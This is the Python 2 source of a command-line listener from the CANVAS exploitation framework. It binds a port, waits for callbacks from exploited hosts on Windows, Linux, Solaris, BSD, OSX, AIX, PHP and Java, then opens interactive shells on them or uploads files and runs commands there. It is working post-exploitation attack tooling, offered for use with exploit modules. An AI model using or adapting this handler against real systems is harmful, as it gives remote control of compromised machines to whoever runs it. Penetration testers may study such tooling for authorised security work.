#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

commandlineInterface.py

Use this before running the exploit modules

"""

import getopt,sys,os,socket,time

#covers both angles
if "." not in sys.path: sys.path.append(".")


    
from exploitutils import *
try:
    from linuxNode   import linuxNode
    from solarisNode import solarisNode
    from bsdNode     import bsdNode
    from osxNode     import osxNode
    from ScriptNode  import ScriptNode
    from aixNode     import aixNode
except:
    print "Not loading linux or solaris for CRI"

from unixShellNode import unixShellNode    
from localNode import localNode
old_tech=0
if old_tech:
    from solarissparcsyscallserver import solarissparc

#for Unixshell Nodes
from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
from MOSDEFShellServer import MosdefShellServer

class commandline_logger:
    
    def __init__(self, *fd):
        self.fileobjects = fd

    def write(self, string):
        
        for fileobject in self.fileobjects:
            fileobject.write(string)
    
    def flush( self ):
        for fileobject in self.fileobjects:
            fileobject.flush()

class interactiveServer:
    def __init__(self):
        port=""
        self.type=""
        self.mode="interactive"
        self.callback=None
        self.command=""
        self.uploadfiles=[]
        self.debug=0
        self.targets=["LINUXEXECVE_INTEL", "WIN32MOSDEF_INTEL", "LINUXMOSDEF_INTEL", "SOLARISMOSDEF_SPARC", "SOLARISMOSDEF_INTEL", "BSDMOSDEF_INTEL", "OSXMOSDEF_INTEL", "OSXMOSDEF_PPC", "AIXMOSDEF_51_PPC", "AIXMOSDEF_52_PPC", "PHPMULTI", "JAVA", "HTTPMOSDEF", "HTTPMOSDEF_SSL", "UNIXSHELL"]
        self.argsDict={}
        self.client=None
        self.engine=None
        #used for secondary callbacks...
        self.localport=None
        self.localhost=None
        self.infile=None
        self.ipv6 = 0
        self.initstring=""
        return

    def log(self,buf):
        """stub that prints out a string: buf"""
        #print buf
        self.engine.log(buf)
               
        
    def setMode(self,mode):
        self.mode=mode
        
    def setType(self,type):
        # see targets list for valid types
        self.type = type
        return

    def setConnectionCallback(self,callback):
        """
        register a callback - used by the engine to get statistics and stuff
        """
        self.callback=callback
        return
        
    def setPort(self,port):
        self.port=int(port)
        return

    def getPort(self):
        return self.port

    def doBind(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.set_timeout(None)
        listenhost=""
        listenport=self.port
        self.log("Binding to %s:%d"%(listenhost,listenport))
        s.bind((listenhost, listenport))
        s.listen(5)
        self.s=s
        return

    def doBind6(self):
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listenhost="::"
        listenport=self.port
        self.log("Binding to %s:%d"%(listenhost,listenport))
        s.bind((listenhost, listenport))
        s.listen(5)
        self.s=s
        return
    
    def getArgs(self):
        """This function will get arguments from some global places..."""
        #not finished
        if not self.localhost:
            self.localhost=getLocalIP()
            print "Localhost set to %s"%self.localhost
        return 

    def run(self):
        self.getArgs()
        filename="listener-%d" % self.port
        try:
            os.unlink(filename)
        except :
            pass

        if self.type == self.targets.index("HTTPMOSDEF"):
            self.engine.set_callback_interface(self.localhost)
            self.engine.start_http_mosdef(self.port) # default has SSL turned off
            self.s = self.engine.get_http_mosdef(self.port)

        elif self.type == self.targets.index("HTTPMOSDEF_SSL"):
            self.engine.set_callback_interface(self.localhost)
            self.engine.start_http_mosdef(self.port, ssl=True)
            self.s = self.engine.get_http_mosdef(self.port)

        else:
            if self.ipv6:
                print "[!] Switching MOSDEF into IPv6 mode !"
                self.doBind6()
            else:
                self.doBind()

        while 1:
            #Here we write our listener-5555 file 
            #this tells other commandline exploits that we succeeded.
            #AKA. If the file exists, we get a callback.
            devlog("commandline","[!] Listening on port %d ..."%self.port)

            try:
                self.s.set_timeout(None)
            except:
                devlog("commandline", "[!] likely a socket wrapper object, set_timeout not supported ...")

            if self.type in [self.targets.index("HTTPMOSDEF"), self.targets.index("HTTPMOSDEF_SSL")]:
                # if type is HTTP MOSDEF .. the node is started and registered from the HTTP MOSDEF engine!
                devlog("commandline", "[!] HTTP MOSDEF node connection will be handled by HTTP MOSDEF engine ...")
                try:
                    time.sleep(5) # poll our nodelist every n seconds
                    if len(self.engine.nodeList):
                        self.log("Have a node in the nodelist")
                        lastnode=self.engine.nodeList[-1]
                        lastnode.shell.interact()
                except KeyboardInterrupt:
                    # need to implement rich's kill-queue for clean gui exits ..
                    print "Exiting"
                    sys.exit(0)
            else:
                conn, addr = self.s.accept()
                self.log("Connected to by %s"%str(addr))
                f=file(filename, "w")     
                self.client=addr
                self.handleConnection(conn)
        return

    def handleConnection(self,connection):

        try:
            connection.set_timeout(None)
        except:
            self.log("[!] likely an ipv6 socket, set_timeout not supported !")

        server=None
        if self.type==self.targets.index("LINUXEXECVE_INTEL"):
            self.log("Connected: Running a Linux server...")
            import linuxMosdefShellServer
            #time.sleep(10)
            newshell=unixShellNode()
            pnode=localNode()
            pnode.newNode(newshell)
            server=linuxMosdefShellServer.execveshellserver(connection, newshell)
            #server.addInitString(self.initstring)
            #server.addInitString("chrootbreak")
            server.startup()

        elif self.type==self.targets.index("LINUXMOSDEF_INTEL"):
            self.log("Connected, Linux MOSDEF ...")
            newshell=linuxNode()
            pnode=localNode()
            pnode.newNode(newshell)
            shell=MosdefShellServer('Linux', 'i386')(connection, newshell)
            #shell=linuxMosdefShellServer.linuxshellserver(connection,newshell)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell
            
        elif self.type == self.targets.index('OSXMOSDEF_INTEL'):
            self.log('Connected, OSX MOSDEF INTEL ...')
            newshell = osxNode()
            pnode = localNode()
            pnode.newNode(newshell)
            shell = MosdefShellServer('OSX', 'i386')(connection, newshell)
            shell.argsDict = self.argsDict
            newshell.startup()
            server = shell
            
        elif self.type==self.targets.index("OSXMOSDEF_PPC"):
            self.log("Connected, OSX MOSDEF PPC ...")
            import osxMosdefShellServer
            newshell=osxNode()
            pnode=localNode()
            pnode.newNode(newshell)
            shell= osxMosdefShellServer.osxshellserver(connection,newshell)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell
            
        elif self.type==self.targets.index("WIN32MOSDEF_INTEL"):
            self.log("Connected, running win32 MOSDEF server")
            import win32MosdefShellServer
            from win32Node import win32Node
            newshell=win32Node()
            pnode=localNode()
            pnode.newNode(newshell)
            shell=win32MosdefShellServer.win32shellserver(connection,newshell,logfunction=None)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell

        elif self.type==self.targets.index("SOLARISMOSDEF_SPARC"):
            self.log("Connected, Solaris MOSDEF ...")
            import solarisMosdefShellServer
            newshell=solarisNode()
            pnode=localNode()
            pnode.newNode(newshell)
            shell=solarisMosdefShellServer.solarisshellserver(connection,newshell)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell

        elif self.type==self.targets.index("SOLARISMOSDEF_INTEL"):
            self.log("Connected, Solaris x86 MOSDEF ...")
            import solarisMosdefShellServer
            newshell=solarisNode()
            pnode=localNode()
            pnode.newNode(newshell)
            shell=solarisMosdefShellServer.solarisx86shellserver(connection,newshell)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell

        elif self.type==self.targets.index("BSDMOSDEF_INTEL"):
            self.log("Connected, BSD MOSDEF")
            import bsdMosdefShellserver
            newshell=bsdNode()
            pnode=localNode()
            pnode.newNode(newshell)
            shell=bsdMosdefShellserver.bsdshellserver(connection,newshell)
            shell.argsDict=self.argsDict
            newshell.startup()
            server=shell
        
        elif self.type==self.targets.index("AIXMOSDEF_51_PPC"):
            self.log("Connected, AIX MOSDEF")
            newshell                = aixNode()
            pnode                   = localNode()
            pnode.newNode(newshell)
            aixMosdefShellServer    = MosdefShellServer('AIX', 'PowerPC')
            shell                   = aixMosdefShellServer(connection, newshell, version='5.1')
            shell.argsDict          = self.argsDict
            newshell.startup()
            server                  = shell

        elif self.type==self.targets.index("AIXMOSDEF_52_PPC"):
            self.log("Connected, AIX MOSDEF")
            newshell                = aixNode()
            pnode                   = localNode()
            pnode.newNode(newshell)
            aixMosdefShellServer    = MosdefShellServer('AIX', 'PowerPC')
            shell                   = aixMosdefShellServer(connection, newshell, version='5.2')
            shell.argsDict          = self.argsDict
            newshell.startup()
            server                  = shell
            
        elif self.type==self.targets.index("PHPMULTI"):
            newsocket=connection
            self.log("Starting up a %s server"%type)
            import phplistener
            from ScriptShellServer import phpshellserver
            node = ScriptNode()
            node.parentnode = self.engine.getLocalNode()
            shell = phpshellserver(newsocket, node)
            shell.startup()
            newshell=node
            server=shell

        elif self.type==self.targets.index("UNIXSHELL"):
            newsocket=connection
            self.log("Starting up Unix Shell")

            pnode=localNode()
            telnetshell=Telnet()
            telnetshell.sock=newsocket
            shell=shelllistener(shellfromtelnet(telnetshell),logfunction=self.log)
            newshell=unixShellNode()
            newshell.shell=shell
            shell.node=newshell
            pnode.newNode(newshell)
            server=shell
            
        elif self.type==self.targets.index("JAVA"):
            newsocket=connection
            self.log("Starting up a %s server"%type)
            from Nodes.JavaShellServer import javashellserver
            from JavaNode import JavaNode
            node = JavaNode()
            node.parentnode = self.engine.getLocalNode()
            shell = javashellserver(newsocket, node)
            shell.startup()
            newshell=node
            server=shell
        else:
            print "Don't know what type I am!"
            sys.exit(1)
            
        if self.mode=="interactive":
            print "Letting user interact with server"
            if server:
                server.interact()
            else:
                print "No server...exiting this shell..."
        elif self.mode=="Run one command":
            print "Running a command or set of commands"
            if self.uploadfiles!=[]:
                for f in self.uploadfiles:
                    print "Uploading %s"%f
                    # Why doesn't this use exploits/upload/upload.py then?
                    print server.upload(f)
            print server.runcommand(self.command)
            ###insert your post-op stuff here!!!
            ###you might want:
            ###server.doexitthread(1)
            ###or
            server.runexitprocess()
        if server:
            server.disconnect()
        return

def printTargets(targets):
    for a in range(0, len(targets)):
        print "%d) %s" % (a, targets[a]) 
            
def usage(targets):
    print """
    Command Line Interface Version 1.0, Immunity, Inc.
    usage: commandlineInterface.py -p port -v <ver number> [-i initstring] [-l localip (for HTTP)]
    initstring values: 
          fromcreatethread (used for MSRPC attacks, for example)
    """
    printTargets(targets)

#this stuff happens.
if __name__ == '__main__':

    print "Running command line interface v 1.0"
    print "Copyright Immunity, Inc."
    print "If using an MSRPC attack, use the -i fromcreatethread option"
     
    app = interactiveServer()

    app.setType("WIN32MOSDEF")    
    port=""
    
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"dp:c:u:v:i:l:df:X")
    except getopt.GetoptError:
        #print help
        usage(app.targets)
        sys.exit(2)
    i=0
    for o,a in opts:
        if o in ["-f"]:
            app.infile=a
        if o in ["-p"]:
            i+=1
            port=a
            app.setPort(a)
        if o in ["-c"]:
            app.command=a
            app.setMode("Run one command")
        if o in ["-d"]:
            app.localport=int(a)
        if o in ["-u"]:
            app.uploadfiles.append(a)
        if o in ["-i"]:
            a=a.replace("formcreatethread","fromcreatethread")
            app.argsDict[a]=1
        if o in ["-l"]:
            app.localhost=a

        # XXX: switches commandline mosdef into IPv6 mode ;)
        if o in ["-X"]:
            app.ipv6 = 1

        if o in ["-v"]:
            a=int(a)
            if a < len(app.targets) :
                i+=1
                app.setType(a)
            else:
                print "unknown target"
            
    if i!=2 :
        usage(app.targets)
        sys.exit(0)
    import canvasengine
    engine=canvasengine.canvasengine(None)
    engine.openlogfile()
    sys.stdout = commandline_logger( sys.stdout, engine.logfile )
    
    try:
        engine.localsniffer.shutdown() #don't need this
    except:
        pass
    app.engine=engine
    try:
        app.run()
    except timeoutsocket.Timeout:
        print "Failed to run commandline...socket timed out. DEP?"
        
        
